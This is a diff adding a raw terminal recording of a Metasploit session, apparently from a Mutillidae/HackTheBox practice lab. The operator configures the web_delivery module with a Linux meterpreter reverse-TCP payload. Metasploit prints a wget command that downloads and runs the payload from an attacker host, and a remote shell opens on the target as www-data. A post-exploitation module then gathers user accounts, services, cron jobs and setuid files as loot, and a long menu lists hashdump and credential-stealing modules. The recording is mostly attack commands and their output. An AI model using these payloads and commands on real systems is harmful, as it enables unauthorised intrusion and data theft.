@@ -1,0 +1,1688 @@
+Script started on 2020-09-04 21:18:00+05:30 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/Echo_Message[01;31mdinesh@evil[00m: [[01;34mEcho_Message[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/Echo_Message[01;31mdinesh@evil[00m: [[01;34mEcho_Message[00m] $ msfconsole -q
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+^[[A
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> sessions -k 1
+[0m[1m[34m[*][0m Killing the following session(s): 1
+[1m[31m[-][0m Invalid session identifier: 1
+[4mmsf5[0m [0m> sessions -k 1i[C[C[K[C[C[C[C[C[C[C[Pexploit[Cshow options [C[C[C[C[C[C[C[Cet LHOST 10.10.10.10[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[Phow options [C[C[C[C[C[C[C[Cet payload linux/x64/meterpreter/reverse_tcp [C[C[C[C[C[C[C[Chow options [K[C[C[C[C[C[C[C[Cet target Linux [C[C[C[C[C[C[C[C[P[P[P[Phow  target[Coptions[C[C[C[C[C[C[C[Cuse exploit/multi/script/web_delivery
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use exploit/multi/script/web_delivery[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psessions -k 1i[C[C[K[Pexploit[Cshow options et LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options et payload linux/x64/meterpreter/reverse_tcp 
+[0mpayload => linux/x64/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/meterpreter/reverse_tcp [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[Puse exploit/multi/script/web_delivery[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psessions -k 1i[C[C[K[Pexploit[Cshow options et LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options et payload linux/x64/meterpreter/reverse_tcp [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Chow options [Ket target Linux 
+[0mtarget => Linux
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options et target Linux payload linux/x64/meterpreter/reverse_tcp [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[Puse exploit/multi/script/web_delivery[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psessions -k 1i[C[C[K[Pexploit[Cshow options et LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options et LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+[1m[34m[*][0m Using URL: http://0.0.0.0:8080/rmZeGbftxMx4pt1
+[1m[34m[*][0m Local IP: http://10.10.10.10:8080/rmZeGbftxMx4pt1
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+wget -qO KUtloGus --no-check-certificate http://10.10.10.10:8080/rmZeGbftxMx4pt1; chmod +x KUtloGus; ./KUtloGus& disown
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m Sending stage (3012516 bytes) to 10.10.10.8
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.8:38728) at 2020-09-04 21:19:06 +0530
+[0m
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                       Connection
+  --  ----  ----                   -----------                                                       ----------
+  1         meterpreter x64/linux  no-user @ htblab (uid=33, gid=33, euid=33, egid=33) @ 10.10.10.8  10.10.10.10:4444 -> 10.10.10.8:38728 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use POpost/
+Display all 343 possibilities? (y or n)
+use post/aix/hashdump                                       use post/windows/gather/credentials/domain_hashdump
+use post/android/capture/screen                             use post/windows/gather/credentials/dynazip_log
+use post/android/gather/hashdump                            use post/windows/gather/credentials/dyndns
+use post/android/gather/sub_info                            use post/windows/gather/credentials/enum_cred_store
+use post/android/gather/wireless_ap                         use post/windows/gather/credentials/enum_laps
+use post/android/manage/remove_lock                         use post/windows/gather/credentials/enum_picasa_pwds
+use post/android/manage/remove_lock_root                    use post/windows/gather/credentials/epo_sql
+use post/apple_ios/gather/ios_image_gather                  use post/windows/gather/credentials/filezilla_server
+use post/apple_ios/gather/ios_text_gather                   use post/windows/gather/credentials/flashfxp
+use post/brocade/gather/enum_brocade                        use post/windows/gather/credentials/ftpnavigator
+use post/bsd/gather/hashdump                                use post/windows/gather/credentials/ftpx
+use post/cisco/gather/enum_cisco                            use post/windows/gather/credentials/gpp
+use post/firefox/gather/cookies                             use post/windows/gather/credentials/heidisql
+use post/firefox/gather/history                             use post/windows/gather/credentials/idm
+use post/firefox/gather/passwords                           use post/windows/gather/credentials/imail
+use post/firefox/gather/xss                                 use post/windows/gather/credentials/imvu
+use post/firefox/manage/webcam_chat                         use post/windows/gather/credentials/mcafee_vse_hashdump
+use post/hardware/automotive/can_flood                      use post/windows/gather/credentials/mdaemon_cred_collector
+use post/hardware/automotive/canprobe                       use post/windows/gather/credentials/meebo
+use post/hardware/automotive/getvinfo                       use post/windows/gather/credentials/mremote
+use post/hardware/automotive/identifymodules                use post/windows/gather/credentials/mssql_local_hashdump
+use post/hardware/automotive/malibu_overheat                use post/windows/gather/credentials/nimbuzz
+use post/hardware/automotive/mazda_ic_mover                 use post/windows/gather/credentials/outlook
+use post/hardware/automotive/pdt                            use post/windows/gather/credentials/purevpn_cred_collector
+use post/hardware/rftransceiver/rfpwnon                     use post/windows/gather/credentials/razer_synapse
+use post/hardware/rftransceiver/transmitter                 use post/windows/gather/credentials/razorsql
+use post/hardware/zigbee/zstumbler                          use post/windows/gather/credentials/rdc_manager_creds
+use post/juniper/gather/enum_juniper                        use post/windows/gather/credentials/skype
+use post/linux/busybox/enum_connections                     use post/windows/gather/credentials/smartermail
+use post/linux/busybox/enum_hosts                           use post/windows/gather/credentials/smartftp
+use post/linux/busybox/jailbreak                            use post/windows/gather/credentials/spark_im
+use post/linux/busybox/ping_net                             use post/windows/gather/credentials/sso
+use post/linux/busybox/set_dmz                              use post/windows/gather/credentials/steam
+--More--[K[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use post/linux/[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use post/linux/
+use post/linux/busybox/enum_connections      use post/linux/gather/enum_psk
+use post/linux/busybox/enum_hosts            use post/linux/gather/enum_system
+use post/linux/busybox/jailbreak             use post/linux/gather/enum_users_history
+use post/linux/busybox/ping_net              use post/linux/gather/enum_xchat
+use post/linux/busybox/set_dmz               use post/linux/gather/gnome_commander_creds
+use post/linux/busybox/set_dns               use post/linux/gather/gnome_keyring_dump
+use post/linux/busybox/smb_share_root        use post/linux/gather/hashdump
+use post/linux/busybox/wget_exec             use post/linux/gather/mount_cifs_creds
+use post/linux/dos/xen_420_dos               use post/linux/gather/openvpn_credentials
+use post/linux/gather/checkcontainer         use post/linux/gather/phpmyadmin_credsteal
+use post/linux/gather/checkvm                use post/linux/gather/pptpd_chap_secrets
+use post/linux/gather/ecryptfs_creds         use post/linux/gather/tor_hiddenservices
+use post/linux/gather/enum_commands          use post/linux/manage/dns_spoofing
+use post/linux/gather/enum_configs           use post/linux/manage/download_exec
+use post/linux/gather/enum_nagios_xi         use post/linux/manage/iptables_removal
+use post/linux/gather/enum_network           use post/linux/manage/pseudo_shell
+use post/linux/gather/enum_protections       use post/linux/manage/sshkey_persistence
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> use post/linux/e[Kgather/enum_system 
+[0m[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> show options 
+[0m
+Module options (post/linux/gather/enum_system):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> set session 1
+[0msession => 1
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> [H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> r
+reload      reload_all  reload_lib  rename_job  repeat      rerun       resource    rexploit    route       run         
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> run -[H[2J[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> run -[K
+[0m
+[1m[32m[+][0m Info:
+[1m[32m[+][0m 	Kali GNU/Linux Rolling  
+[1m[32m[+][0m 	Linux htblab 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64 GNU/Linux
+[1m[32m[+][0m 	Module running as "www-data" user
+[1m[34m[*][0m Linux version stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_533747.txt
+[1m[34m[*][0m User accounts stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_143188.txt
+[1m[34m[*][0m Installed Packages stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_911740.txt
+[1m[34m[*][0m Running Services stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_455864.txt
+[1m[34m[*][0m Cron jobs stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_582147.txt
+[1m[34m[*][0m Disk info stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_316358.txt
+[1m[34m[*][0m Logfiles stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_456924.txt
+[1m[34m[*][0m Setuid/setgid files stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_832692.txt
+[1m[34m[*][0m CPU Vulnerabilities stored in /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+[1m[34m[*][0m Post module execution completed
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> sys[K[K[Kls
+[0m[1m[34m[*][0m exec: ls
+
+01.session	 01.session.lck  01.session.properties	01.session.tmp
+01.session.data  01.session.log  01.session.script	terminal_log_Fri_04_Sep_2020_09:18:00_PM_IST.dmp
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> ls /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+[0m[1m[34m[*][0m exec: ls /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+
+/home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> ls /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt[P[P /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txte /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt[P /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txtl /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txte /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txts /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txts /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+[0m[1m[34m[*][0m exec: less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+
+[?1049h[22;0;0t[?1h=/sys/devices/system/cpu/vulnerabilities/spectre_v2:Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+/sys/devices/system/cpu/vulnerabilities/itlb_multihit:KVM: Vulnerable
+/sys/devices/system/cpu/vulnerabilities/mds:Mitigation: Clear CPU buffers; SMT Host state unknown
+/sys/devices/system/cpu/vulnerabilities/l1tf:Mitigation: PTE Inversion
+/sys/devices/system/cpu/vulnerabilities/spec_store_bypass:Vulnerable
+/sys/devices/system/cpu/vulnerabilities/tsx_async_abort:Not affected
+/sys/devices/system/cpu/vulnerabilities/spectre_v1:Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+/sys/devices/system/cpu/vulnerabilities/meltdown:Mitigation: PTI
+[7m/home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+/sys/devices/system/cpu/vulnerabilities/spectre_v2:Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+/sys/devices/system/cpu/vulnerabilities/itlb_multihit:KVM: Vulnerable
+/sys/devices/system/cpu/vulnerabilities/mds:Mitigation: Clear CPU buffers; SMT Host state unknown
+/sys/devices/system/cpu/vulnerabilities/l1tf:Mitigation: PTE Inversion
+/sys/devices/system/cpu/vulnerabilities/spec_store_bypass:Vulnerable
+/sys/devices/system/cpu/vulnerabilities/tsx_async_abort:Not affected
+/sys/devices/system/cpu/vulnerabilities/spectre_v1:Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+/sys/devices/system/cpu/vulnerabilities/meltdown:Mitigation: PTI
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> loot 
+[0m
+Loot
+====
+
+host        service  type               name            content     info                 path
+----        -------  ----               ----            -------     ----                 ----
+10.10.10.8           linux.version      linux_info.txt  text/plain  Linux Version        /home/dinesh/.msf4/loot/20200904212050_default_10.10.10.8_linux.version_136000.txt
+10.10.10.8           linux.enum.system                  text/plain  Linux version        /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_533747.txt
+10.10.10.8           linux.enum.system                  text/plain  User accounts        /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_143188.txt
+10.10.10.8           linux.enum.system                  text/plain  Installed Packages   /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_911740.txt
+10.10.10.8           linux.enum.system                  text/plain  Running Services     /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_455864.txt
+10.10.10.8           linux.enum.system                  text/plain  Cron jobs            /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_582147.txt
+10.10.10.8           linux.enum.system                  text/plain  Disk info            /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_316358.txt
+10.10.10.8           linux.enum.system                  text/plain  Logfiles             /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_456924.txt
+10.10.10.8           linux.enum.system                  text/plain  Setuid/setgid files  /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_832692.txt
+10.10.10.8           linux.enum.system                  text/plain  CPU Vulnerabilities  /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_983197.txt
+
+[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_832692.txt
+[0m[1m[34m[*][0m exec: less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_832692.txt
+
+[?1049h[22;0;0t[?1h=[K[7m/home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_832692.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+...skipping...
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_456924.txt
+[0m[1m[34m[*][0m exec: less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_456924.txt
+
+[?1049h[22;0;0t[?1h=/var/log/alternatives.log.2.gz
+/var/log/macchanger.log.1.gz
+/var/log/dpkg.log
+/var/log/alternatives.log.1
+/var/log/stunnel4/stunnel.log
+/var/log/macchanger.log.2.gz
+/var/log/wtmp
+/var/log/dpkg.log.1
+/var/log/macchanger.log.3.gz
+/var/log/apt/history.log.1.gz
+/var/log/apt/history.log.2.gz
+/var/log/apt/eipp.log.xz
+/var/log/apt/history.log.3.gz
+/var/log/apt/history.log
+/var/log/fontconfig.log
+/var/log/dpkg.log.2.gz
+/var/log/macchanger.log
+/var/log/alternatives.log.3.gz
+/var/log/alternatives.log
+/var/log/macchanger.log.4.gz
+/var/log/dpkg.log.3.gz
+/var/log/faillog
+/var/log/lastlog
+/var/log/installer/lsb-release
+/var/log/installer/status
+/var/log/installer/hardware-summary
+[7m/home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_456924.txt (END)[27m[K[K [KESCESC[KOO[KAA[K...skipping...
+/var/log/alternatives.log.2.gz
+/var/log/macchanger.log.1.gz
+/var/log/dpkg.log
+/var/log/alternatives.log.1
+/var/log/stunnel4/stunnel.log
+/var/log/macchanger.log.2.gz
+/var/log/wtmp
+/var/log/dpkg.log.1
+/var/log/macchanger.log.3.gz
+/var/log/apt/history.log.1.gz
+/var/log/apt/history.log.2.gz
+/var/log/apt/eipp.log.xz
+/var/log/apt/history.log.3.gz
+/var/log/apt/history.log
+/var/log/fontconfig.log
+/var/log/dpkg.log.2.gz
+/var/log/macchanger.log
+/var/log/alternatives.log.3.gz
+/var/log/alternatives.log
+/var/log/macchanger.log.4.gz
+/var/log/dpkg.log.3.gz
+/var/log/faillog
+/var/log/lastlog
+/var/log/installer/lsb-release
+/var/log/installer/status
+/var/log/installer/hardware-summary
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[1m~[0m
+[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t[4mmsf5[0m post([1m[31mlinux/gather/enum_system[0m) [0m> less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_316358.txt
+[0m[1m[34m[*][0m exec: less /home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_316358.txt
+
+[?1049h[22;0;0t[?1h=/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+udev on /dev type devtmpfs (rw,nosuid,noexec,relatime,size=474132k,nr_inodes=118533,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=100900k,mode=755)
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+sunrpc on /run/rpc_pipefs type rpc_pipefs (rw,relatime)
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+none on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+debugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
+tracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=12139)
+binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
+hackthebox.eu on /mnt/shared type vboxsf (rw,nodev,relatime,iocharset=utf8,uid=0,gid=140,dmode=0770,fmode=0770,tag=VBoxAutomounter)
+/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro)
+[7m/home/dinesh/.msf4/loot/20200904212106_default_10.10.10.8_linux.enum.syste_316358.txt[27m[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K/dev/sda1 on /var/tmp type ext4 (rw,relatime,errors=remount-ro)
+:[K[K [KESCESC[KOO[KBB[Ktmpfs on /run/user/130 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=130,gid=139)
+:[K[K [KESCESC[KOO[KBB[Kfusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse on /run/user/130/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=130,group_id=139)
+:[K[K [KESCESC[KOO[KBB[Ktmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=100896k,mode=700,uid=1000,gid=1000)
+:[K[K [KESCESC[KOO[KBB[Kgvfsd-fuse on /run/user/1000/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=1000,group_id=1000)
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[KFilesystem     Type         Size  Used Avail Use% Mounted on
+:[K[K [KESCESC[KOO[KBB[K/dev/sda1      ext4          19G   13G  4.3G  76% /
+:[K[K [KESCESC[KOO[KBB[Kudev           devtmpfs     464M     0  464M   0% /dev
+:[K[K [KESCESC[KOO[KBB[Kdevpts         devpts          0     0     0    - /dev/pts
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        493M     0  493M   0% /dev/shm
+:[K[K [KESCESC[KOO[KBB[Kmqueue         mqueue          0     0     0    - /dev/mqueue
+:[K[K [KESCESC[KOO[KBB[Khugetlbfs      hugetlbfs       0     0     0    - /dev/hugepages
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs         99M  1.1M   98M   2% /run
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        5.0M     0  5.0M   0% /run/lock
+:[K[K [KESCESC[KOO[KBB[Ksunrpc         rpc_pipefs      0     0     0    - /run/rpc_pipefs
+:[K[K [KESCESC[KOO[KBB[Ksysfs          sysfs           0     0     0    - /sys
+:[K[K [KESCESC[KOO[KBB[Ksecurityfs     securityfs      0     0     0    - /sys/kernel/security
+:[K[K [KESCESC[KOO[KBB[Ktmpfs          tmpfs        493M     0  493M   0% /sys/fs/cgroup
+:[K[K [KESCESC[KOO[KBB[Kcgroup2        cgroup2         0     0     0    - /sys/fs/cgroup/unified
